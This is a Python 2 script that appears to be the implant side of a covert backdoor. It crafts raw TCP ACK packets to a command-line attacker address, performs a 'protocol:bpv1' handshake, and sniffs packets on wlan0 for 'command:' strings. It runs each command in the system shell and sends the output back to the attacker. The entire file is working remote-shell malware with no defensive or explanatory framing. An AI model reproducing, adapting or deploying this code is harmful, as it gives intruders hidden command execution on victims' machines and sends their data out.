import sys
import os
import socket
import struct
import time
import random
import commands       
import share                                      

def send_to_attacker(data_str):
    syn = random.randint(2 ** 31, 2 ** 32)
    ack = random.randint(2 ** 31, 2 ** 32)
    pkt = share.craft_ack((victim_host, victim_port, attacker_host, attacker_port), 
                          (syn, ack), data_str )
    sender.sendto(pkt, (attacker_host, attacker_port) )

def handshake():
    begin = 0
    time_elapsed = 0
    receiver.settimeout(10)   
    while True:
        send_to_attacker("protocol:bpv1" + "\r\n")
        begin = time.time()
        time_elapsed = time.time() - begin
        try:
            while time_elapsed < 10:
                reply = receiver.recvfrom(2048)[0]
                if "signal:ok" in reply:
                    break                            
                else:
                    time_elapsed = time.time() - begin
            else:
                continue
            break        
        except socket.timeout:
            continue
    receiver.settimeout(None)

def getip():
    while True:
        host_name = socket.gethostname()
        if host_name != "localhost":
            return socket.gethostbyname(host_name)

if len(sys.argv) == 3:
    attacker_host = sys.argv[1]  # attacker ip
    attacker_port = int(sys.argv[2]) # attacker port
    victim_host = getip() # get victim ip
    victim_port = 80 # random.randint(2 ** 15, 2 ** 16) # a random port for backdoor connection
else:
    print "[-] options must be specified in the following format"
    print "[*] python %s attacker_ip attacker_port" % sys.argv[0]  
    exit(0)

session_begin = False        
sender = socket.socket(socket.AF_INET, socket.SOCK_RAW, 6) # to send command results or errors
receiver = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))  # to receive commands
receiver.bind(("wlan0", 0x0800)) 

 
while True:
    if not session_begin:
        handshake()
        session_begin = True
    try:
        packet = receiver.recvfrom(2048)[0]
        if "command:" in packet:
            command = packet.split("command:")[1].strip("\r\n")
            # Each separate call to os commands cannot maintain 
            # the "change directory" session. 
            # So I come up with an idea of handling this case. 
            if command.startswith("cd "): 
                path = command.lstrip("cd ").strip("\"").strip("\'")
                os.chdir(path)
                response = "output:" + "Directory changed to " + path + "\r\n"
                send_to_attacker(response)
            # Any other commands than "cd" rely on native os
            # shell. 
            else:   
                output = "output:" + commands.getstatusoutput(command)[1] + "\r\n"
                send_to_attacker(output)
            session_begin = False if command == "exit" else True
    except KeyboardInterrupt:
        sender.close()
        receiver.close()
        break

        
        
               
        
